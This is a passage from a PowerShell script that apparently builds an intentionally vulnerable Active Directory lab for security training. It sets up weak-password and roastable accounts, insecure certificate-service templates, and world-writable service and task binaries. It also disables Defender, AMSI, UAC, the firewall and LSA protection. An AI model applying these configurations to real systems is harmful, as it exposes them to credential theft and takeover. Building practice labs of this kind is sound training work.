      # Enable NTLM authentication on certificate enrollment
      Set-WebConfigurationProperty -Filter '/system.webServer/security/authentication/windowsAuthentication' -Name 'enabled' -Value 'True' -PSPath 'IIS:\Sites\Default Web Site\CertSrv' -ErrorAction SilentlyContinue

      Set-WebConfigurationProperty -Filter '/system.webServer/security/authentication/windowsAuthentication/providers' `
        -Name 'clear' -Value $true -PSPath 'IIS:\Sites\Default Web Site\CertSrv' -ErrorAction SilentlyContinue

      Add-WebConfigurationProperty -Filter '/system.webServer/security/authentication/windowsAuthentication/providers' `
        -Name '.' -Value @{value = 'NTLM' } -PSPath 'IIS:\Sites\Default Web Site\CertSrv' -ErrorAction SilentlyContinue

      Write-Log "Configured ESC8: NTLM authentication on AD CS HTTP endpoints" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not configure ESC8 vulnerability: $_" -Level WARNING
    }

    # ESC9: No Security Extension template
    try {
      $templateName = "VulnerableUserESC9"
      $templateContent = @"
oid = 1.3.6.1.4.1.311.21.8.15312345.12345678.1234567.123456789.1234567890.123.1234567890.1234567
[NewRequest]
Subject = "CN=ESC9Template"
KeySpec = 1
KeyLength = 2048
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
MachineKeySet = TRUE
RequestType = Cert
[Extensions]
2.5.29.37 = "{text}1.3.6.1.5.5.7.3.2,1.3.6.1.5.5.7.3.1"
"@

      $templatePath = "C:\VulnerableShare\$templateName.inf"
      $templateContent | Out-File -FilePath $templatePath -Force
      Write-Log "Created ESC9 template: $templateName (No Security Extension)" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not create ESC9 template: $_" -Level WARNING
    }

    # ESC10: Weak Certificate Mappings
    try {
      # Configure weak certificate mappings
      $mappingScript = @"
# ESC10: Weak Certificate Mappings
# This allows certificate authentication with weak subject alternative names
Set-ADUser -Identity 'admin.backup' -Certificates @{Add=@('CN=admin.backup,DC=lab,DC=local')}
"@

      $mappingPath = "C:\VulnerableShare\weak_cert_mappings.ps1"
      $mappingScript | Out-File -FilePath $mappingPath -Force
      Write-Log "Created ESC10 configuration: Weak Certificate Mappings" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not configure ESC10 vulnerability: $_" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error setting up advanced certificate vulnerabilities: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Creates vulnerable scheduled tasks with weak permissions
#>
function Set-VulnerableScheduledTasks {
  try {
    $taskName = "VulnerableBackup"
    $scriptPath = "C:\VulnerableShare\backup.bat"

    # Create the vulnerable script
    $scriptContent = @"
@echo off
REM Vulnerable backup script
xcopy C:\ImportantData\* C:\Backup\ /s /e
"@

    if (-not (Test-Path "C:\VulnerableShare")) {
      New-Item -Path "C:\VulnerableShare" -ItemType Directory -Force | Out-Null
    }

    $scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII

    # Set weak permissions on the script
    icacls $scriptPath /grant "Everyone:(F)" /T /C | Out-Null

    # Create the scheduled task
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $scriptPath"
    $trigger = New-ScheduledTaskTrigger -Daily -At "2:00AM"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

    Write-Log "Created vulnerable scheduled task: $taskName" -Level INFO
    return $true
  }
  catch {
    Write-Log "Error creating vulnerable scheduled task: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Creates services with weak permissions for privilege escalation.
#>
function Set-VulnerableServices {
  try {
    # Create a service with weak permissions
    $serviceName = "VulnerableService"
    $servicePath = "C:\VulnerableShare\vuln_service.exe"

    # Create a simple vulnerable service binary (just a copy of cmd.exe for demonstration)
    if (-not (Test-Path $servicePath)) {
      Copy-Item -Path "$env:windir\System32\cmd.exe" -Destination $servicePath -Force
    }

    # Create the service if it doesn't exist
    if (-not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
      New-Service -Name $serviceName -BinaryPathName $servicePath -DisplayName "Vulnerable Service" -StartupType Automatic -ErrorAction Stop | Out-Null
    }

    # Set weak permissions on the service
    $SDDL = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;CCLCSWRPWPDTLOCRRC;;;WD)"
    & sc.exe sdset $serviceName $SDDL | Out-Null

    # Set weak permissions on the binary
    icacls $servicePath /grant "Everyone:(F)" /T /C | Out-Null

    Write-Log "Created vulnerable service: $serviceName with weak permissions" -Level INFO
    return $true
  }
  catch {
    Write-Log "Error creating vulnerable service: $_" -Level WARNING
    return $false
  }
}

# Add more vulnerability functions here as needed

#endregion

#region Core Functions

<#
.SYNOPSIS
    Configures the network settings for the domain controller.
.DESCRIPTION
    This function sets up the static IP address, DNS settings, and renames the computer
    to match the domain controller naming convention.
#>
function Set-NetworkConfiguration {
  [CmdletBinding()]
  param()

  Write-Log "Configuring network settings..."

  try {
    # Get the network adapter
    $adapter = Get-NetAdapter -Name $Script:NetworkConfig.InterfaceAlias -ErrorAction Stop

    # Remove existing IP addresses if any
    Get-NetIPAddress -InterfaceAlias $adapter.Name -ErrorAction SilentlyContinue |
    Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue

    # Set static IP address
    $ipParams = @{
      InterfaceAlias = $adapter.Name
      IPAddress      = $Script:NetworkConfig.IPAddress
      PrefixLength   = $Script:NetworkConfig.PrefixLength
      DefaultGateway = $Script:NetworkConfig.DefaultGateway
      ErrorAction    = 'Stop'
    }

    Get-NetRoute -InterfaceAlias $adapter.Name -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Remove-NetRoute -Confirm:$false -ErrorAction SilentlyContinue
    New-NetIPAddress @ipParams | Out-Null

    # Set DNS servers
    Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses $Script:NetworkConfig.DNSServers -ErrorAction Stop
    # Rename computer
    $currentName = (Get-ComputerInfo -Property CsName).CsName
    if ($currentName -ne $Script:DomainConfig.DCName) {
      # Rename computer and check if restart is needed
      try {
        Write-Log "Renaming computer from $currentName to $($Script:DomainConfig.DCName)" -Level INFO
        Rename-Computer -NewName $Script:DomainConfig.DCName -Force -Restart:$false -ErrorAction Stop
        Write-Log "Computer renamed to $($Script:DomainConfig.DCName) successfully" -Level SUCCESS

        # Check if a restart is pending due to name change
        $restartPending = $false
        try {
          # Check registry for pending computer name change
          $pendingName = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" -Name "ComputerName" -ErrorAction SilentlyContinue
          $activeName = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName" -Name "ComputerName" -ErrorAction SilentlyContinue

          if ($pendingName.ComputerName -ne $activeName.ComputerName) {
            $restartPending = $true
            Write-Log "Computer name change is pending. Restart required before DC promotion." -Level WARNING
          }
        }
        catch {
          # If we can't check registry, assume restart is needed after rename
          $restartPending = $true
          Write-Log "Cannot verify name change status. Assuming restart is required." -Level WARNING
        }

        if ($restartPending) {
          Write-Log "Computer name change requires restart. System will restart now..." -Level INFO
          Write-Log "The script will automatically continue after restart." -Level INFO

          # Create state file for post-rename restart
          $stateFile = Join-Path -Path $PSScriptRoot -ChildPath ".adlab_state"
          $stateData = @{
            Step                = 'PostRename'
            DomainName          = $Script:DomainConfig.DomainName
            DomainNetbiosName   = $Script:DomainConfig.DomainNetbiosName
            DomainAdminPassword = $Script:DomainConfig.DomainAdminPassword
            IPAddress           = $Script:NetworkConfig.IPAddress
            PrefixLength        = $Script:NetworkConfig.PrefixLength
            DefaultGateway      = $Script:NetworkConfig.DefaultGateway
            DNSServers          = $Script:NetworkConfig.DNSServers
          }

          if (New-StateFile -FilePath $stateFile -StateData $stateData) {
            Write-Log "State file created for post-rename restart" -Level INFO
          }

          # Force restart to complete the name change
          Start-Sleep -Seconds 2
          Restart-Computer -Force
          # Script execution will stop here and resume after restart
          return $true
        }
      }
      catch {
        Write-Log "Failed to rename computer: $_" -Level WARNING
        Write-Log "Continuing with current computer name..." -Level INFO
      }
    }
    else {
      Write-Log "Computer name is already $($Script:DomainConfig.DCName), skipping rename." -Level INFO
    }

    Write-Log "Network configuration completed successfully" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Failed to configure network settings: $_" -Level ERROR
    return $false
  }
}

<#
.SYNOPSIS
    Installs and configures Active Directory Domain Services.
.DESCRIPTION
    This function installs the AD DS role, promotes the server to a domain controller,
    and configures the new forest with the specified domain name.
#>
function Install-ActiveDirectory {
  [CmdletBinding()]
  param()

  Write-Log "Starting Active Directory installation..." -Level INFO

  try {
    # Check if AD is already installed
    $adDomain = $null
    try {
      $adDomain = Get-ADDomain -ErrorAction SilentlyContinue
    }
    catch { }

    if ($adDomain) {
      Write-Log "Active Directory is already installed and configured" -Level INFO
      return $true
    }

    # Check if AD CS is installed and configured
    $adcs = Get-WindowsFeature -Name ADCS-Cert-Authority
    if ($adcs -and $adcs.Installed) {
      Write-Log "Certificate Services is installed - will configure after DC promotion" -Level INFO
    }

    # Install required Windows features
    $features = @(
      'AD-Domain-Services',
      'DNS'
    )

    Write-Log "Installing Windows features: $($features -join ', ')" -Level INFO
    $featureResult = Install-WindowsFeature -Name $features -IncludeManagementTools -ErrorAction Stop -Verbose:$false

    if ($featureResult.Success -eq $false) {
      Write-Log "Failed to install required Windows features" -Level ERROR
      return $false
    }

    Write-Log "Windows features installed successfully" -Level SUCCESS

    # Configure AD Forest parameters
    $params = @{
      DomainName                    = $Script:DomainConfig.DomainName
      DomainNetbiosName             = $Script:DomainConfig.DomainNetbiosName
      InstallDns                    = $true
      Force                         = $true
      SafeModeAdministratorPassword = $Script:DomainConfig.SafeModePassword
      NoRebootOnCompletion          = $false  # Allow automatic restart
      ErrorAction                   = 'Stop'
    }

    Write-Log "Promoting server to Domain Controller. System will restart automatically..." -Level INFO
    Write-Log "Domain: $($Script:DomainConfig.DomainName)" -Level INFO
    Write-Log "NetBIOS: $($Script:DomainConfig.DomainNetbiosName)" -Level INFO

    # Create the new forest - this will automatically restart the system
    Install-ADDSForest @params | Out-Null

    # This line should not be reached due to automatic restart
    Write-Log "Active Directory installation initiated successfully" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Failed to install Active Directory: $_" -Level ERROR
    Write-Log "Error details: $($_.Exception.Message)" -Level ERROR
    return $false
  }
}

function Add-RandomAndRemove {
  [CmdletBinding()]
  param (
    [Parameter(Mandatory = $true)]
    [string]$ArrayName
  )

  try {
    $array = Get-Variable -Name $ArrayName -Scope Script -ValueOnly -ErrorAction Stop
    if ($array -isnot [array] -or $array.Count -eq 0) {
      return $null
    }

    $index = Get-Random -Minimum 0 -Maximum $array.Count
    $item = $array[$index]
    $array = $array | Where-Object { $_ -ne $item }
    Set-Variable -Name $ArrayName -Value $array -Scope Script

    return $item
  }
  catch {
    Write-Log "Error in Add-RandomAndRemove: $_" -Level WARNING
    return $null
  }
}

<#
.SYNOPSIS
    Creates intentionally vulnerable user accounts with weak credentials.
.DESCRIPTION
    This function creates multiple user accounts with weak passwords, service accounts
    with SPNs for kerberoasting, and accounts with dangerous privileges like unconstrained
    delegation and AS-REP roastable configurations.
#>
function Set-VulnerableUsers {
  [CmdletBinding()]
  param(
    [int]$UserCount = $Script:UserCount
  )

  Write-Log "Creating users with weak passwords and misconfigurations..." -Level INFO

  try {
    # Check OS version to determine password requirements
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)

    # Create users with weak passwords
    foreach ($user in $Script:UserConfig.WeakPasswordUsers) {
      try {
        if (![string]::IsNullOrWhiteSpace($user.Name)) {
          # Make password Server 2025 compliant but still weak
          $userPassword = $user.Password
          if ($isServer2025OrNewer -and $userPassword.Length -lt 3) {
            $userPassword = $userPassword + "123"  # Make it at least 3 chars
          }

          $password = ConvertTo-SecureString -String $userPassword -AsPlainText -Force
          $labUsersOU = Get-LabUsersOU
          $userParams = @{
            Name                 = $user.Name
            GivenName            = $user.GivenName
            Surname              = $user.Surname
            DisplayName          = "$($user.GivenName) $($user.Surname)"
            SamAccountName       = $user.Name
            UserPrincipalName    = "$($user.Name)@$($Script:DomainConfig.DomainName)"
            Description          = $user.Description
            AccountPassword      = $password
            Path                 = $labUsersOU
            Enabled              = $true
            PasswordNeverExpires = $true
            CannotChangePassword = $true
            ErrorAction          = 'Stop'
          }

          # Check if user already exists
          $existingUser = Get-ADUser -Filter "Name -eq '$($user.Name)'" -ErrorAction SilentlyContinue
          if ($existingUser) {
            # Update existing user's password
            Set-ADAccountPassword -Identity $user.Name -NewPassword $password -Reset -ErrorAction Stop
            Set-ADUser -Identity $user.Name -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
            Write-Log "Updated existing user password: $($user.Name) with password: $userPassword" -Level INFO
          }
          else {
            # Create new user
            New-ADUser @userParams
            Write-Log "Created vulnerable user: $($user.Name) with password: $userPassword" -Level INFO
          }

          Add-UserToTracking -Username $user.Name -Password $userPassword -Description $user.Description -Groups $user.Groups
        }

        # Add to groups if specified
        if ($user.Groups) {
          foreach ($group in $user.Groups) {
            try {
              Add-ADGroupMember -Identity $group -Members $user.Name -ErrorAction Stop
              Write-Log "Added user $($user.Name) to group: $group" -Level INFO
            }
            catch {
              Write-Log "Warning: Could not add user $($user.Name) to group $group`: $($_.Exception.Message)" -Level WARNING
            }
          }
        }
      }
      catch {
        Write-Log "Error creating user $($user.Name): $($_.Exception.Message)" -Level WARNING
      }
    }

    # Create random users with weak passwords
    for ($i = 1; $i -le $UserCount; $i++) {
      $username = $null
      if ($Script:UserConfig.Usernames -and $Script:UserConfig.Usernames.Count -gt 0) {
        # Create a local copy to modify
        $Script:UserConfig.Usernames = [System.Collections.ArrayList]$Script:UserConfig.Usernames
        if ($Script:UserConfig.Usernames.Count -gt 0) {
          $index = Get-Random -Minimum 0 -Maximum $Script:UserConfig.Usernames.Count
          $username = $Script:UserConfig.Usernames[$index]
          $Script:UserConfig.Usernames.RemoveAt($index)
        }
      }

      if (-not $username) {
        $username = "user$i"  # Fallback username
      }

      $password = $Script:UserConfig.WeakPasswords | Get-Random

      # Make password Server 2025 compliant but still weak
      if ($isServer2025OrNewer -and $password.Length -lt 3) {
        $password = $password + "123"  # Make it at least 3 chars
      }

      try {
        $securePass = ConvertTo-SecureString -String $password -AsPlainText -Force
        $labUsersOU = Get-LabUsersOU
        $userParams = @{
          Name                 = $username
          SamAccountName       = $username
          UserPrincipalName    = "$username@$($Script:DomainConfig.DomainName)"
          AccountPassword      = $securePass
          Path                 = $labUsersOU
          Enabled              = $true
          PasswordNeverExpires = $true
          CannotChangePassword = $true
          ErrorAction          = 'Stop'
        }

        # Check if user already exists
        $existingUser = Get-ADUser -Filter "Name -eq '$username'" -ErrorAction SilentlyContinue
        if ($existingUser) {
          # Update existing user's password
          Set-ADAccountPassword -Identity $username -NewPassword $securePass -Reset -ErrorAction Stop
          Set-ADUser -Identity $username -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
          Write-Log "Updated existing random user password: $username with password: $password" -Level INFO
        }
        else {
          # Create new user
          New-ADUser @userParams
          Write-Log "Created random user: $username with password: $password" -Level INFO
        }

        # Randomly decide if this user should have password in description (security misconfiguration)
        $addPasswordToDescription = (Get-Random -Minimum 1 -Maximum 10) -gt 7  # 30% chance
        $userDescription = if ($addPasswordToDescription) {
          "Random generated user - Password: $password"
        }
        else {
          "Random generated user"
        }

        # Update user description if password should be included
        if ($addPasswordToDescription) {
          try {
            Set-ADUser -Identity $username -Description $userDescription -ErrorAction SilentlyContinue
            Write-Log "Added password to description for user: $username" -Level INFO
          }
          catch {
            Write-Log "Error setting description for user $username`: $_" -Level WARNING
          }
        }

        Add-UserToTracking -Username $username -Password $password -Description $userDescription

        # Randomly add to WinRM Remote Management Users group (20% chance)
        if ((Get-Random -Minimum 1 -Maximum 10) -gt 8) {
          try {
            Add-ADGroupMember -Identity "Remote Management Users" -Members $username -ErrorAction SilentlyContinue
            Write-Log "Added random user $username to Remote Management Users group for WinRM access" -Level INFO
          }
          catch {
            Write-Log "Error adding user $username to Remote Management Users group: $_" -Level WARNING
          }
        }

        # Randomly add to some other groups
        if ((Get-Random -Minimum 1 -Maximum 10) -gt 8) {
          $groups = Get-ADGroup -Filter * | Get-Random -Count 2
          if ($groups) {
            # Handle both single group and array of groups
            if ($groups -is [array]) {
              foreach ($group in $groups) {
                Add-ADGroupMember -Identity $group -Members $username -ErrorAction SilentlyContinue
              }
            }
            else {
              Add-ADGroupMember -Identity $groups -Members $username -ErrorAction SilentlyContinue
            }
          }
        }
      }
      catch {
        Write-Log "Error creating random user ${username} : $_" -Level WARNING
      }
    }

    # Create service accounts with SPNs for kerberoasting
    $services = @('SQL', 'IIS', 'Exchange', 'SharePoint', 'Backup', 'Monitoring')
    foreach ($service in $services) {
      $username = "svc_$($service.ToLower())"
      $password = "$($service)Service123"

      try {
        $securePass = ConvertTo-SecureString -String $password -AsPlainText -Force
        $spn = "$service/$($Script:DomainConfig.DCName).$($Script:DomainConfig.DomainName)"

        # Check if service account already exists
        $existingUser = Get-ADUser -Filter "Name -eq '$username'" -ErrorAction SilentlyContinue
        if ($existingUser) {
          # Update existing service account's password
          Set-ADAccountPassword -Identity $username -NewPassword $securePass -Reset -ErrorAction Stop
          Set-ADUser -Identity $username -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue

          # Try to set SPN, but handle conflicts gracefully
          try {
            Set-ADUser -Identity $username -ServicePrincipalNames @{Add = $spn } -ErrorAction Stop
            Write-Log -Message ("Updated service account: {0} with password: {1} and SPN: {2}" -f $username, $password, $spn) -Level "INFO"
          }
          catch {
            Write-Log -Message ("Updated service account: {0} with password: {1} (SPN conflict: {2})" -f $username, $password, $spn) -Level "INFO"
          }
        }
        else {
          # Create new service account with SPN as array
          $labUsersOU = Get-LabUsersOU
          New-ADUser -Name $username `
            -SamAccountName $username `
            -ServicePrincipalNames @($spn) `
            -Description "$service Service Account" `
            -AccountPassword $securePass `
            -Path $labUsersOU `
            -Enabled $true `
            -PasswordNeverExpires $true `
            -CannotChangePassword $true `
            -ErrorAction Stop
          Write-Log -Message ("Created service account: {0} with password: {1} and SPN: {2}" -f $username, $password, $spn) -Level "INFO"
        }

        Add-UserToTracking -Username $username -Password $password -Description "$service Service Account with SPN: $spn"
      }
      catch {
        $errorPart = "Error creating service account"
        $separator = ": "
        $errorDetails = $_
        $errorMsg = "$errorPart $username$separator$errorDetails"
        Write-Log -Message $errorMsg -Level "WARNING"
      }
    }

    # Create AS-REP roastable account
    try {
      $username = "asrep_user"
      $password = "asrep"
      # Make password Server 2025 compliant but still weak
      if ($isServer2025OrNewer -and $password.Length -lt 3) {
        $password = $password + "123"  # Make it at least 3 chars
      }
      $securePass = ConvertTo-SecureString -String $password -AsPlainText -Force

      # Check if AS-REP account already exists
      $existingUser = Get-ADUser -Filter "Name -eq '$username'" -ErrorAction SilentlyContinue
      if ($existingUser) {
        # Update existing account's password
        Set-ADAccountPassword -Identity $username -NewPassword $securePass -Reset -ErrorAction Stop
        Set-ADUser -Identity $username -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
        Write-Log "Updated AS-REP roastable account: $username with password: $password" -Level INFO
      }
      else {
        # Create new account
        $labUsersOU = Get-LabUsersOU
        New-ADUser -Name $username `
          -SamAccountName $username `
          -AccountPassword $securePass `
          -Description "AS-REP Roastable Account" `
          -Path $labUsersOU `
          -Enabled $true `
          -PasswordNeverExpires $true `
          -CannotChangePassword $true `
          -ErrorAction Stop
        Write-Log "Created AS-REP roastable account: $username with password: $password" -Level INFO
      }

      # Set the account to not require pre-authentication
      Set-ADAccountControl -Identity $username -DoesNotRequirePreAuth $true
    }
    catch {
      Write-Log "Error creating AS-REP roastable account: $_" -Level WARNING
    }

    # Create unconstrained delegation account
    try {
      $username = "delegation_user"
      $password = "delegation"
      # Make password Server 2025 compliant but still weak
      if ($isServer2025OrNewer -and $password.Length -lt 3) {
        $password = $password + "123"  # Make it at least 3 chars
      }
      $securePass = ConvertTo-SecureString -String $password -AsPlainText -Force

      # Check if delegation account already exists
      $existingUser = Get-ADUser -Filter "Name -eq '$username'" -ErrorAction SilentlyContinue
      if ($existingUser) {
        # Update existing account's password
        Set-ADAccountPassword -Identity $username -NewPassword $securePass -Reset -ErrorAction Stop
        Set-ADUser -Identity $username -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
        Write-Log "Updated unconstrained delegation account: $username with password: $password" -Level INFO
      }
      else {
        # Create new account
        $labUsersOU = Get-LabUsersOU
        New-ADUser -Name $username `
          -SamAccountName $username `
          -AccountPassword $securePass `
          -Description "Account with unconstrained delegation" `
          -Path $labUsersOU `
          -Enabled $true `
          -PasswordNeverExpires $true `
          -CannotChangePassword $true `
          -ErrorAction Stop
        Write-Log "Created unconstrained delegation account: $username with password: $password" -Level INFO
      }

      # Enable unconstrained delegation
      Set-ADAccountControl -Identity $username -TrustedForDelegation $true
    }
    catch {
      Write-Log "Error creating unconstrained delegation account: $_" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error in Set-VulnerableUsers: $_" -Level ERROR
    return $false
  }
}

<#
.SYNOPSIS
    Configures system settings to introduce security vulnerabilities.
.DESCRIPTION
    This function disables various security features and configures system settings
    to create common security weaknesses for training purposes.
#>
function Set-VulnerableSettings {
  [CmdletBinding()]
  param()

  Write-Log "Configuring vulnerable system settings..." -Level INFO

  try {
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    ## Server 2025
    Set-MpPreference -DisableDatagramProcessing $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    ## Cloud protection
    Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
    # Disable Sample Submission
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force

    # Enable AutoAdminLogon
    $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Script:DomainConfig.DomainAdminPassword))
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -Value $Script:DomainConfig.DomainAdminUsername -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -Value $plainPassword -Force

    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False

    # Enable WDigest (credentials in memory)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Force

    # Enable Remote Registry
    Set-Service -Name "RemoteRegistry" -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name "RemoteRegistry" -ErrorAction SilentlyContinue

    # Disable SMB signing
    Set-SmbServerConfiguration -RequireSecuritySignature 0 -Force -ErrorAction SilentlyContinue
    Set-SmbServerConfiguration -EnableSecuritySignature 0 -Force -ErrorAction SilentlyContinue

    # Enable SMBv1 and check if restart is needed
    Write-Log "Installing SMB1 protocol..." -Level INFO
    $smb1Result = Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol -NoRestart -ErrorAction SilentlyContinue
    
    if ($smb1Result -and $smb1Result.RestartNeeded) {
      Write-Log "SMB1 installation requires a restart. Creating state file and restarting..." -Level INFO
      
      # Create state file for post-SMB1 restart
      $stateFile = "$env:TEMP\.adlab_state"
      $stateData = @{
        Step = 'PostSMB1Install'
        DomainName = $Script:DomainConfig.DomainName
        DomainNetbiosName = $Script:DomainConfig.DomainNetbiosName
        IPAddress = $Script:NetworkConfig.IPAddress
        PrefixLength = $Script:NetworkConfig.PrefixLength
        DefaultGateway = $Script:NetworkConfig.DefaultGateway
        DNSServers = $Script:NetworkConfig.DNSServers
        UserCount = $UserCount
      }
      
      try {
        $stateData | ConvertTo-Json | Set-Content -Path $stateFile -Force
        Write-Log "State file created. System will restart to complete SMB1 installation." -Level SUCCESS
        Write-Log "Please run this script again after restart to continue configuration." -Level INFO
        
        # Restart the computer
        Restart-Computer -Force
        exit 0
      }
      catch {
        Write-Log "Failed to create state file: $_" -Level ERROR
        Write-Log "Continuing without restart, but SMB configurations may not work properly." -Level WARNING
      }
    }
    else {
      Write-Log "SMB1 installed successfully without restart requirement" -Level INFO
    }

    # Additional SMB server configurations for vulnerability testing
    # These will be applied after SMB1 is properly installed
    try {
      Set-SmbServerConfiguration -AnnounceServer $true -EnableSecuritySignature $false -EnableSMB1Protocol $true -ServerHidden $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB server announcement and SMB1 protocol configured" -Level INFO } else { Write-Log "Failed to configure SMB server announcement" -Level WARNING }
      
      Set-SmbServerConfiguration -EnableStrictNameChecking $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB strict name checking disabled" -Level INFO } else { Write-Log "Failed to disable SMB strict name checking" -Level WARNING }
      
      Set-SmbServerConfiguration -ValidateTargetName $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB target name validation disabled" -Level INFO } else { Write-Log "Failed to disable SMB target name validation" -Level WARNING }
      
      Set-SmbServerConfiguration -EnableAuthRateLimiter $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB authentication rate limiter disabled" -Level INFO } else { Write-Log "Failed to disable SMB auth rate limiter" -Level WARNING }
    }
    catch {
      Write-Log "Error configuring additional SMB settings: $_" -Level WARNING
      Write-Log "This may be due to SMB1 not being fully installed. Try running the script again after a manual restart." -Level WARNING
    }

    # Disable LSA Protection
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RunAsPPL" -Value 0 -Force

    # Enable WDigest
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Force

    # Disable AMSI
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "EnableAmsi" -Value 0 -Force -ErrorAction SilentlyContinue

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force

    # Enable and configure WinRM for vulnerability testing
    try {
      # Enable WinRM service
      Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction SilentlyContinue
      Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
      Start-Service -Name WinRM -ErrorAction SilentlyContinue

      # Configure WinRM with weak security settings for testing
      winrm set winrm/config/service/auth '@{Basic="true"}' 2>$null
      winrm set winrm/config/service '@{AllowUnencrypted="true"}' 2>$null
      winrm set winrm/config/winrs '@{AllowRemoteShellAccess="true"}' 2>$null

      # Add firewall rules for WinRM
      New-NetFirewallRule -DisplayName "WinRM-HTTP" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue
      New-NetFirewallRule -DisplayName "WinRM-HTTPS" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow -ErrorAction SilentlyContinue

      Write-Log "WinRM enabled and configured" -Level INFO
    }
    catch {
      Write-Log "Error configuring WinRM: $_" -Level WARNING
    }

    # Add specific users to Remote Management Users group for WinRM access
    try {
      # Define users that should have WinRM access
      $winrmUsers = @(
        "admin.backup",
        "dns.admin",
        "account.operator",
        "svc_web",
        "svc_sql",
        "svc_backup"
      )

      foreach ($user in $winrmUsers) {
        try {
          # Check if user exists before adding to group
          $adUser = Get-ADUser -Identity $user -ErrorAction SilentlyContinue
          if ($adUser) {
            Add-ADGroupMember -Identity "Remote Management Users" -Members $user -ErrorAction SilentlyContinue
            Write-Log "Added user $user to Remote Management Users group for WinRM access" -Level INFO
          }
          else {
            Write-Log "User $user not found, skipping WinRM group addition" -Level WARNING
          }
        }
        catch {
          Write-Log "Error adding user $user to Remote Management Users group: $_" -Level WARNING
        }
      }

      Write-Log "WinRM user access configuration completed" -Level INFO
    }
    catch {
      Write-Log "Error configuring WinRM user access: $_" -Level WARNING
    }

    # Enable remote UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force

    # Disable Windows Update
    Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
